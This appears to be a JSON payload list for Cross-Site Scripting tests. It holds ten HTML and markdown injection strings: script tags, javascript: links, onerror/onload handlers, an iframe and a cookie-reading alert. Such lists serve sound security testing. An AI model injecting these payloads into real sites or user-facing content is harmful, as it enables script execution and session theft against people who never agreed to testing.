{
  "category": "xss_markdown",
  "description": "HTML or markdown scripts, onerror/onload attributes, iframe injections to test for Cross-Site Scripting.",
  "payloads": [
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "[Click Me](javascript:alert(1))",
    "![image](x)\" onerror=\"alert(1)",
    "<svg/onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>",
    "'-alert(1)-'"
  ]
}
